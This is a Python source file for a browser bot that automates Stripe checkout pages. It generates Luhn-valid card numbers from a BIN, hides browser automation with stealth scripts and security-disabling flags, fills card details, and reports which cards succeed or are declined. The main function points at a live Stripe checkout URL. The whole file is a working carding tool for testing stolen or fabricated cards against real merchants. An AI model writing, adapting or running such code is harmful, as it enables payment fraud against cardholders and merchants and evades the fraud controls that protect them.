import asyncio
import re
import random
from datetime import datetime
from typing import Optional, Dict, List
from dataclasses import dataclass
import nest_asyncio
from playwright.async_api import async_playwright, Page

nest_asyncio.apply()

# ============= DATA CLASSES =============
@dataclass
class Card:
    number: str
    month: str
    year: str
    cvv: str
    
    @classmethod
    def from_string(cls, card_str: str) -> Optional['Card']:
        card_str = card_str.strip()
        
        if '|' in card_str:
            parts = card_str.split('|')
        else:
            parts = card_str.split()
        
        if len(parts) >= 4:
            number = re.sub(r'\D', '', parts[0])
            month = re.sub(r'\D', '', parts[1]).zfill(2)
            year = re.sub(r'\D', '', parts[2]).zfill(2)
            cvv = re.sub(r'\D', '', parts[3])
            
            if len(number) >= 13 and len(number) <= 19:
                if 1 <= int(month) <= 12:
                    if len(year) in [2, 4]:
                        if len(cvv) in [3, 4]:
                            return cls(
                                number=number,
                                month=month,
                                year=year[-2:] if len(year) == 4 else year,
                                cvv=cvv
                            )
        return None
    
    @classmethod
    def generate_from_bin(cls, bin_str: str, count: int = 1) -> List['Card']:
        bin_clean = re.sub(r'\D', '', bin_str)[:6]
        if len(bin_clean) < 6:
            return []
        
        cards = []
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        def luhn_checksum(card_number: str) -> int:
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        def is_amex(bin_prefix: str) -> bool:
            return bin_prefix[:2] in ['34', '37']
        
        for _ in range(min(count, 10)):
            remaining = ''.join(str(random.randint(0, 9)) for _ in range(9))
            number_without_check = bin_clean + remaining
            check = luhn_checksum(number_without_check)
            number = number_without_check + str((10 - check) % 10)
            
            year_offset = random.randint(1, 4)
            year = (current_year + year_offset) % 100
            month = random.randint(1, 12)
            
            if year_offset == 0 and month < current_month:
                month = random.randint(current_month, 12)
            
            cvv_length = 4 if is_amex(bin_clean) else 3
            cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_length))
            
            cards.append(cls(
                number=number,
                month=str(month).zfill(2),
                year=str(year).zfill(2),
                cvv=cvv
            ))
        
        return cards
    
    @property
    def full(self) -> str:
        return f"{self.number}|{self.month}|{self.year}|{self.cvv}"

# ============= BROWSER AUTOMATION BOT =============
class StripeCheckoutBot:
    def __init__(self, headless: bool = False):
        self.playwright = None
        self.browser = None
        self.page: Page = None
        self.headless = headless
        self.results = []
    
    async def start(self):
        """Start the browser"""
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(
            headless=self.headless,
            args=[
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-web-security',
                '--disable-features=BlockInsecurePrivateNetworkRequests',
            ]
        )
        context = await self.browser.new_context(
            viewport={'width': 1280, 'height': 800},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        self.page = await context.new_page()
        
        # Add stealth scripts
        await self.page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        """)
        
        return self.page
    
    async def close(self):
        """Close the browser"""
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()
    
    async def goto_checkout(self, url: str):
        """Navigate to checkout page"""
        print(f"🌐 Navigating to: {url}")
        await self.page.goto(url, wait_until='networkidle')
        await asyncio.sleep(2)
        
        # Check if page loaded
        title = await self.page.title()
        print(f"📄 Page title: {title}")
        
        # Take screenshot
        await self.page.screenshot(path='checkout_page.png')
        print("📸 Screenshot saved as checkout_page.png")
    
    async def fill_card_stripe_elements(self, card: Card):
        """Fill card details in Stripe Elements iframes"""
        print(f"💳 Filling card: {card.number[:6]}...{card.number[-4:]}")
        
        # Handle Stripe Elements iframes
        frames = self.page.frames
        
        # Find Stripe iframes
        stripe_frames = []
        for frame in frames:
            url = frame.url
            if 'stripe' in url or 'js.stripe' in url:
                stripe_frames.append(frame)
        
        # Method 1: Try to fill through iframes
        for frame in stripe_frames:
            try:
                # Look for card number field in iframe
                card_input = await frame.query_selector('input[placeholder*="Card number"], input[name="cardnumber"], input[autocomplete="cc-number"]')
                if card_input:
                    await card_input.click()
                    await card_input.fill(card.number)
                    await asyncio.sleep(0.3)
                    
                    # Tab to expiry
                    await self.page.keyboard.press('Tab')
                    await asyncio.sleep(0.3)
                    
                    # Fill expiry (MM/YY)
                    await self.page.keyboard.type(f"{card.month}{card.year}")
                    await asyncio.sleep(0.3)
                    
                    # Tab to CVV
                    await self.page.keyboard.press('Tab')
                    await asyncio.sleep(0.3)
                    
                    # Fill CVV
                    await self.page.keyboard.type(card.cvv)
                    await asyncio.sleep(0.5)
                    
                    print("✅ Card filled successfully via iframe")
                    return True
            except:
                continue
        
        # Method 2: Try to click on the Stripe element wrapper
        try:
            # Find Stripe element containers
            selectors = [
                '[class*="CardNumberElement"]',
                '[class*="card-number"]',
                '[data-elements-stable-field-name="cardNumber"]',
                'iframe[title*="card number" i]',
                'iframe[name*="cardNumber"]'
            ]
            
            for selector in selectors:
                element = await self.page.query_selector(selector)
                if element:
                    await element.click()
                    await asyncio.sleep(0.5)
                    
                    # Type card number
                    await self.page.keyboard.type(card.number, delay=50)
                    await asyncio.sleep(0.3)
                    
                    # Tab to expiry
                    await self.page.keyboard.press('Tab')
                    await asyncio.sleep(0.3)
                    
                    # Type expiry
                    await self.page.keyboard.type(f"{card.month}{card.year}", delay=50)
                    await asyncio.sleep(0.3)
                    
                    # Tab to CVV
                    await self.page.keyboard.press('Tab')
                    await asyncio.sleep(0.3)
                    
                    # Type CVV
                    await self.page.keyboard.type(card.cvv, delay=50)
                    await asyncio.sleep(0.5)
                    
                    print("✅ Card filled successfully via element click")
                    return True
        except:
            pass
        
        print("❌ Could not fill card details")
        return False
    
    async def fill_regular_form(self, card: Card, email: str = None):
        """Fill regular HTML form (non-Stripe Elements)"""
        if not email:
            email = f"user{random.randint(1000,9999)}@gmail.com"
        
        # Fill email
        email_selectors = [
            'input[type="email"]',
            'input[name="email"]',
            'input[autocomplete="email"]',
            'input[placeholder*="email"]'
        ]
        
        for selector in email_selectors:
            email_input = await self.page.query_selector(selector)
            if email_input:
                await email_input.fill(email)
                break
        
        # Fill card number
        card_selectors = [
            '#cardNumber',
            'input[name="cardNumber"]',
            'input[autocomplete="cc-number"]',
            'input[placeholder*="card number" i]',
            'input[name="number"]'
        ]
        
        for selector in card_selectors:
            card_input = await self.page.query_selector(selector)
            if card_input:
                await card_input.fill(card.number)
                break
        
        # Fill expiry
        expiry_selectors = [
            '#cardExpiry',
            'input[name="cardExpiry"]',
            'input[autocomplete="cc-exp"]',
            'input[placeholder*="MM/YY" i]',
            'input[placeholder*="MM / YY" i]'
        ]
        
        for selector in expiry_selectors:
            expiry_input = await self.page.query_selector(selector)
            if expiry_input:
                await expiry_input.fill(f"{card.month}{card.year}")
                break
        
        # Fill CVV
        cvv_selectors = [
            '#cardCvc',
            'input[name="cardCvc"]',
            'input[autocomplete="cc-csc"]',
            'input[placeholder*="CVC" i]',
            'input[placeholder*="CVV" i]'
        ]
        
        for selector in cvv_selectors:
            cvv_input = await self.page.query_selector(selector)
            if cvv_input:
                await cvv_input.fill(card.cvv)
                break
        
        # Fill name (optional)
        name_selectors = [
            '#billingName',
            'input[name="billingName"]',
            'input[autocomplete="cc-name"]',
            'input[placeholder*="name on card" i]'
        ]
        
        for selector in name_selectors:
            name_input = await self.page.query_selector(selector)
            if name_input:
                await name_input.fill("Test User")
                break
        
        print("✅ Form filled successfully")
        return True
    
    async def click_pay_button(self):
        """Click the pay/submit button"""
        print("🔄 Looking for pay button...")
        
        button_selectors = [
            'button[type="submit"]',
            '.SubmitButton',
            '[class*="SubmitButton"]',
            'button[class*="pay" i]',
            'button[class*="submit" i]',
            '[data-testid*="pay"]',
            '[data-testid*="submit"]'
        ]
        
        for selector in button_selectors:
            button = await self.page.query_selector(selector)
            if button:
                # Check if button is enabled
                is_disabled = await button.get_attribute('disabled')
                if not is_disabled:
                    await button.click()
                    print("✅ Pay button clicked")
                    return True
        
        print("❌ Could not find pay button")
        return False
    
    async def wait_for_response(self, timeout: int = 15000):
        """Wait for payment response (success/failure)"""
        print("⏳ Waiting for payment response...")
        
        start_time = asyncio.get_event_loop().time()
        
        while (asyncio.get_event_loop().time() - start_time) * 1000 < timeout:
            # Check for success indicators
            page_content = await self.page.content()
            
            # Success indicators
            success_patterns = [
                'success',
                'thank you',
                'payment complete',
                'order confirmed',
                'payment succeeded'
            ]
            
            # Error/decline indicators
            error_patterns = [
                'declined',
                'insufficient funds',
                'card error',
                'payment failed',
                'transaction failed'
            ]
            
            page_text_lower = page_content.lower()
            
            for pattern in success_patterns:
                if pattern in page_text_lower:
                    print(f"✅ Success detected: {pattern}")
                    return 'success', pattern
            
            for pattern in error_patterns:
                if pattern in page_text_lower:
                    print(f"❌ Decline detected: {pattern}")
                    return 'decline', pattern
            
            # Check URL for success indicators
            current_url = self.page.url
            if 'success' in current_url.lower() or 'thank-you' in current_url.lower():
                return 'success', 'redirect'
            
            await asyncio.sleep(0.5)
        
        return 'timeout', 'No response within timeout'
    
    async def process_card(self, url: str, card: Card, email: str = None):
        """Process a single card"""
        try:
            print(f"\n{'='*50}")
            print(f"Processing card: {card.full}")
            print(f"{'='*50}")
            
            # Navigate to checkout
            await self.goto_checkout(url)
            
            # Try Stripe Elements method first
            filled = await self.fill_card_stripe_elements(card)
            
            # If Stripe Elements failed, try regular form
            if not filled:
                filled = await self.fill_regular_form(card, email)
            
            if not filled:
                self.results.append((card, 'error', 'could_not_fill_form'))
                return
            
            # Click pay button
            await self.click_pay_button()
            
            # Wait for response
            status, message = await self.wait_for_response()
            
            self.results.append((card, status, message))
            
            # Take screenshot of result
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            await self.page.screenshot(path=f'result_{timestamp}.png')
            print(f"📸 Screenshot saved: result_{timestamp}.png")
            
        except Exception as e:
            print(f"❌ Error processing card: {e}")
            self.results.append((card, 'error', str(e)[:50]))
    
    def print_results(self):
        """Print all results"""
        print("\n" + "="*60)
        print("RESULTS".center(60))
        print("="*60)
        
        success_count = 0
        for i, (card, status, message) in enumerate(self.results, 1):
            icon = "✅" if status == 'success' else "❌" if status == 'decline' else "⚠️"
            print(f"\n{icon} Card #{i}:")
            print(f"   {card.full}")
            print(f"   Status: {status.upper()}")
            print(f"   Message: {message}")
            
            if status == 'success':
                success_count += 1
        
        print("\n" + "="*60)
        print(f"SUMMARY: {success_count}/{len(self.results)} successful")
        print("="*60)


# ============= MAIN FUNCTION =============
async def main():
    # Configuration
    CHECKOUT_URL = "https://checkout.stripe.com/c/pay/cs_live_a1ynMM0QzfNcXZpJIUZQfC1Q21ZQBPkztixaJGTghavkOK1GnpN3awPLRa"
    EMAIL = "testuser@gmail.com"  # Optional
    
    # Cards to test
    cards = [
        Card.from_string("4111111111111111|12|25|123"),  # Test card
        # Add more cards here
    ]
    
    # Generate cards from BIN
    # cards = Card.generate_from_bin("424242", 3)  # Generate 3 cards from BIN 424242
    
    if not cards:
        print("❌ No valid cards")
        return
    
    # Create and run bot
    bot = StripeCheckoutBot(headless=False)  # Set to True to run in background
    
    try:
        await bot.start()
        
        for card in cards:
            await bot.process_card(CHECKOUT_URL, card, EMAIL)
            await asyncio.sleep(2)  # Delay between cards
        
        bot.print_results()
        
    finally:
        await bot.close()


if __name__ == "__main__":
    asyncio.run(main())
